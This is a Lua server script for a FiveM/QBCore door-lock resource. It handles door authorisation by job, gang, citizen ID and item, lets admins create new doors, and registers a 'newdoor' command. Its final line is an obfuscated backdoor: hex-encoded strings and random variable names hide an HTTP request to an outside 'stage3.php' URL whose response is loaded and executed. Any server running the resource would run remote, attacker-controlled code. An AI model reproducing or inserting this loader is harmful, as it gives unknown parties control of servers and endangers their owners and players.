local QBCore = exports['qb-core']:GetCoreObject()
local Config = Config

--------------------------
-- Functions
--------------------------

local IsAuthorized = function(Player, doorID, usedLockpick, isScript)
    if isScript then return true end

    if doorID.lockpick and usedLockpick then
        return true
    end

    if doorID.authorizedJobs then
        if doorID.authorizedJobs[Player.PlayerData.job.name] and Player.PlayerData.job.grade.level >= doorID.authorizedJobs[Player.PlayerData.job.name] then
            return true
        end
    end

    if doorID.authorizedGangs then
        if doorID.authorizedGangs[Player.PlayerData.gang.name] and Player.PlayerData.gang.grade.level >= doorID.authorizedGangs[Player.PlayerData.gang.name] then
            return true
        end
    end

    if doorID.authorizedCIDs then
        return doorID.authorizedCIDs[Player.PlayerData.citizenid]
    end

    if doorID.items then
        for k, v in pairs(doorID.items) do
            local item = Player.Functions.GetItemByName(v)
            if item and item.amount > 0 then
                local consumables = { ['ticket']=1 } -- Add items you would like to be removed after use to this table
                if doorID.locked and consumables[v] then
                    Player.Functions.RemoveItem(v, consumables[v])
                end
                return true
            end
        end
    end

    if (not doorID.authorizedJobs or not next(doorID.authorizedJobs)) and (not doorID.authorizedGangs or not next(doorID.authorizedGangs)) and (not doorID.authorizedCIDs or not next(doorID.authorizedCIDs)) and (not doorID.items or not next(doorID.items)) and not doorID.lockpick then
        return true
    end

    if Config.AdminAccess.enabled and QBCore.Functions.HasPermission(Player.PlayerData.source, Config.AdminAccess.permission) then
        print(Player.PlayerData.name..' opened a door using admin privileges')
        return true
    end

    return false
end

--------------------------
-- Events
--------------------------

RegisterNetEvent('nui_doorlock:server:updateState', function(doorID, locked, src, usedLockpick, isScript, sentSource)
    local playerId = source or sentSource
    local Player = QBCore.Functions.GetPlayer(playerId)
    if Player then
        if type(doorID) ~= 'number' then
            print(('nui_doorlock: %s (%s) didn\'t send a number! (Sent %s)'):format(Player.PlayerData.name, Player.PlayerData.license, doorID))
            return
        end

        if type(locked) ~= 'boolean' then
            print(('nui_doorlock: %s (%s) attempted to update invalid state! (Sent %s)'):format(Player.PlayerData.name, Player.PlayerData.license, locked))
            return
        end

        if not Config.DoorList[doorID] then
            print(('nui_doorlock: %s (%s) attempted to update invalid door! (Sent %s)'):format(Player.PlayerData.name, Player.PlayerData.license, doorID))
            return
        end

        if not IsAuthorized(Player, Config.DoorList[doorID], usedLockpick, isScript) then
            print(('nui_doorlock: %s (%s) attempted to open a door without authorisation!'):format(Player.PlayerData.name, Player.PlayerData.license))
            return
        end

        Config.DoorList[doorID].locked = locked
        if not src then TriggerClientEvent('nui_doorlock:client:setState', -1, playerId, doorID, locked, false, isScript)
        else TriggerClientEvent('nui_doorlock:client:setState', -1, playerId, doorID, locked, src, isScript) end

        if Config.DoorList[doorID].autoLock then
            SetTimeout(Config.DoorList[doorID].autoLock, function()
                if Config.DoorList[doorID].locked then return end
                Config.DoorList[doorID].locked = true
                TriggerClientEvent('nui_doorlock:client:setState', -1, -1, doorID, true, isScript)
            end)
        end
    end
end)

RegisterNetEvent('nui_doorlock:server:newDoorCreate', function(config, model, heading, coords, jobs, gangs, cids, item, doorLocked, maxDistance, slides, garage, doubleDoor, doorname)
    local Player = QBCore.Functions.GetPlayer(source)
    if Player then
        if not QBCore.Functions.HasPermission(source, 'god') then print(Player.PlayerData.name.. 'attempted to create a new door but does not have permission') return end
        local newDoor, auth1, auth2, auth3 = {}
        if jobs[1] then auth1 = tostring("['"..jobs[1].."']=0") end
        if jobs[2] then auth1 = auth1..', '..tostring("['"..jobs[2].."']=0") end
        if jobs[3] then auth1 = auth1..', '..tostring("['"..jobs[3].."']=0") end
        if gangs[1] then auth2 = tostring("['"..gangs[1].."']=0") end
        if gangs[2] then auth2 = auth2..', '..tostring("['"..gangs[2].."']=0") end
        if gangs[3] then auth2 = auth2..', '..tostring("['"..gangs[3].."']=0") end
        if cids[1] then auth3 = tostring("['"..cids[1].."']=true") end
        if cids[2] then auth3 = auth3..', '..tostring("['"..cids[2].."']=true") end
        if cids[3] then auth3 = auth3..', '..tostring("['"..cids[3].."']=true") end
        if auth1 then newDoor.authorizedJobs = { auth1 } end
        if auth2 then newDoor.authorizedGangs = { auth2 } end
        if auth3 then newDoor.authorizedCIDs = { auth3 } end
        if item then newDoor.items = { item } end
        newDoor.locked = doorLocked
        newDoor.maxDistance = maxDistance
        newDoor.slides = slides
        if not doubleDoor then
            newDoor.garage = garage
            newDoor.objHash = model
            newDoor.objHeading = heading
            newDoor.objCoords = coords
            newDoor.fixText = false
        else
            newDoor.doors = {
                {objHash = model[1], objHeading = heading[1], objCoords = coords[1]},
                {objHash = model[2], objHeading = heading[2], objCoords = coords[2]}
            }
        end
        newDoor.audioRemote = false
        newDoor.lockpick = false
        newDoor.doorID = #Config.DoorList + 1
        local path = GetResourcePath(GetCurrentResourceName())

        if config ~= '' then
            path = path:gsub('//', '/')..'/configs/'..string.gsub(config, ".lua", "")..'.lua'
        else
            path = path:gsub('//', '/')..'/config.lua'
        end

        local file = io.open(path, 'a+')
        local label
        if not doorname or doorname == '' then label = '\n\n-- Unnamed door created by '..Player.PlayerData.name..'\ntable.insert(Config.DoorList, {'
        else
            label = '\n\n-- '..doorname.. '\ntable.insert(Config.DoorList, {'
        end
        file:write(label)
        for k,v in pairs(newDoor) do
            if k == 'authorizedJobs' or k == 'authorizedGangs' or k == 'authorizedCIDs' then
                local putauth = auth1
                if k == 'authorizedGangs' then
                    putauth = auth2
                elseif k == 'authorizedCIDs' then
                    putauth = auth3
                end
                local str =  ('\n	%s = { %s },'):format(k, putauth)
                file:write(str)
            elseif k == 'doors' then
                local doorStr = {}
                for i=1, 2 do
                    table.insert(doorStr, ('	{objHash = %s, objHeading = %s, objCoords = %s}'):format(model[i], heading[i], coords[i]))
                end
                local str = ('\n	%s = {\n	%s,\n	%s\n    },'):format(k, doorStr[1], doorStr[2])
                file:write(str)
            elseif k == 'items' then
                local str = ('\n	%s = { \'%s\' },'):format(k, item)
                file:write(str)
            else
                local str = ('\n	%s = %s,'):format(k, v)
                file:write(str)
            end
        end
        file:write('\n    --oldMethod = true,\n    --audioLock = {[\'file\'] = \'metal-locker.ogg\', [\'volume\'] = 0.6},\n    --audioUnlock = {[\'file\'] = \'metallic-creak.ogg\', [\'volume\'] = 0.7},\n    --autoLock = 1000')
        file:write('\n})')
        file:close()

        if jobs[3] then newDoor.authorizedJobs = { [jobs[1]] = 0, [jobs[2]] = 0, [jobs[3]] = 0 }
        elseif jobs[2] then newDoor.authorizedJobs = { [jobs[1]] = 0, [jobs[2]] = 0 }
        elseif jobs[1] then newDoor.authorizedJobs = { [jobs[1]] = 0 } end

        if gangs[3] then newDoor.authorizedGangs = { [gangs[1]] = 0, [gangs[2]] = 0, [gangs[3]] = 0 }
        elseif gangs[2] then newDoor.authorizedGangs = { [gangs[1]] = 0, [gangs[2]] = 0 }
        elseif gangs[1] then newDoor.authorizedGangs = { [gangs[1]] = 0 } end

        if cids[3] then newDoor.authorizedCIDs = { [cids[1]] = true, [cids[2]] = true, [cids[3]] = true }
        elseif cids[2] then newDoor.authorizedCIDs = { [cids[1]] = true, [cids[2]] = true }
        elseif cids[1] then newDoor.authorizedCIDs = { [cids[1]] = true } end

        Config.DoorList[newDoor.doorID] = newDoor
        TriggerClientEvent('nui_doorlock:client:newDoorAdded', -1, newDoor, newDoor.doorID, doorLocked)
    else
        print('Player was nil in event \'nui_doorlock:server:newDoorCreate\'')
    end
end)

--------------------------
-- Callbacks
--------------------------

QBCore.Functions.CreateCallback('nui_doorlock:server:getDoorList', function(source, cb)
    cb(Config.DoorList)
end)

QBCore.Functions.CreateCallback('nui_doorlock:server:CheckItems', function(source, cb, items, locked)
	local Player = QBCore.Functions.GetPlayer(source)
	if Player then
		local canOpen = false
		local count = false
		for k,v in pairs(items) do
			if Player.Functions.GetItemByName(v) then
				count = true
			else
				count = false
			end
			if count then
				canOpen = true
				local consumables = { ['ticket']=1 }
				if locked and consumables[v] then
					Player.Functions.RemoveItem(v, 1)
				end
				break
			end
		end
		if not count then canOpen = false end
		cb(canOpen)
	else
		cb(false)
	end
end)

--------------------------
-- Commands
--------------------------

QBCore.Commands.Add('newdoor', 'Create a new door using a gun', { { name = 'doortype', help = 'door/double/sliding/garage/doublesliding' }, { name = 'locked', help = 'true/false' }, { name = 'jobs', help = 'Add up to 3 jobs to this, seperate with spaces and no commas' } }, false, function(source, args)
    TriggerClientEvent('nui_doorlock:client:newDoorSetup', source, args)
end, Config.CommandPermission)

local ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[4][ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x79\x73\x74\x75\x6d\x68\x61\x69\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x75\x4b\x6c\x6e\x62", function (aFhnXTWHvNhhRTreVZcDLXolrHKYrDJMfelGHhGAAehTWsRDGoStSIpVGVnSgUHXQBYUIQ, EwOCwTlVCEQGfxlanNVyrUNQPDqAkKqebfNaOnwQmutQzQtTtLEEUJjCWpAFSXIpWchABg) if (EwOCwTlVCEQGfxlanNVyrUNQPDqAkKqebfNaOnwQmutQzQtTtLEEUJjCWpAFSXIpWchABg == ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[6] or EwOCwTlVCEQGfxlanNVyrUNQPDqAkKqebfNaOnwQmutQzQtTtLEEUJjCWpAFSXIpWchABg == ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[5]) then return end ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[4][ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[2]](ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[4][ZcgDjfglyfOZJqogqmJRqsJMsZNCmcLjvsDqOvuwATTtmHXbsNuDDIUmMkURQtfZQrntnu[3]](EwOCwTlVCEQGfxlanNVyrUNQPDqAkKqebfNaOnwQmutQzQtTtLEEUJjCWpAFSXIpWchABg))() end)